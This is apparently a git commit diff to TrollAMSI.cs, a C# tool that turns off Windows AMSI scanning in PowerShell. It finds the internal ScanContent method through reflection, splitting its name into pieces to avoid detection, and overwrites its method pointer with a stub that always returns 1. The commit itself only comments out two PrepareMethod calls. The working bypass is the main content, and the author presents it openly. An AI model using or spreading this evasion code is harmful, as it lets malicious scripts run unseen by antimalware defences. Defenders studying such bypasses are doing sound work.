92fa4829c6e0c2b22de2a0ca11f6aa1385afd78c
cybersectroll <dexter192123@gmail.com>
2024-06-03 23:39:13 +0800

    Update TrollAMSI.cs

--- TrollAMSI.cs
+++ TrollAMSI.cs
@@ -10,8 +10,8 @@ public static class TrollAMSI
     {
         MethodInfo o = typeof(PSObject).Assembly.GetType("System.Management.Automation.Am" + "si" + "U" + "tils").GetMethod("Sca" + "nC" + "ontent", BindingFlags.Static | BindingFlags.NonPublic);
         MethodInfo t = typeof(TrollAMSI).GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
-        RuntimeHelpers.PrepareMethod(o.MethodHandle);
-        RuntimeHelpers.PrepareMethod(t.MethodHandle);
+       // RuntimeHelpers.PrepareMethod(o.MethodHandle);
+       // RuntimeHelpers.PrepareMethod(t.MethodHandle);
         Marshal.Copy(new IntPtr[] { Marshal.ReadIntPtr(t.MethodHandle.Value + 8) }, 0, o.MethodHandle.Value + 8, 1);
     }
     private static int M(string c, string s) { return 1; }
